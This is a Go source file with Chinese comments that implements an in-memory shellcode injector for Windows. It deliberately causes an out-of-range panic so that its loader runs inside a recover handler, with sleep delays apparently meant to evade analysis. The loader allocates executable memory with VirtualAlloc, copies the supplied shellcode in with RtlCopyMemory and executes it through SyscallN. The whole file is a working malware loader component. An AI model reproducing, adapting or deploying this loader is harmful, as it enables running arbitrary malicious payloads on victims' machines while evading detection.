package server

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

//Inject shellcode注入函数
func Inject(b []byte) {

	//捕获数组下标越界
	defer func() {
		if err := recover(); err != nil {
			time.Sleep(5 * time.Second)
			//调用Windows API
			var (
				VirtualAlloc  = syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc") //使用kernel32.dll的VirtualAlloc函数申请虚拟内存
				RtlCopyMemory = syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory")   //内存块复制
			)
			time.Sleep(5 * time.Second)
			//使用内存操作api开辟一块内存，然后将shellcode的字节流写入
			addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), 0x1000|0x2000, 0x40)
			if err != nil && err.Error() != "The operation completed successfully." {
				syscall.Exit(0)
			}
			time.Sleep(5 * time.Second)
			//非重叠复制内存区域，将这片内存复制
			_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
			if err != nil && err.Error() != "The operation completed successfully." {
				syscall.Exit(0)
			}
			time.Sleep(5 * time.Second)
			//执行成功之后会返回The operation completed successfully，所以直接将其打印出来
			fmt.Println(err)
			syscall.SyscallN(addr, 0, 0, 0, 0)
		}
	}()

	var count []int
	//使之数组下标越界
	count = append(count[:1], count[2:]...)
}
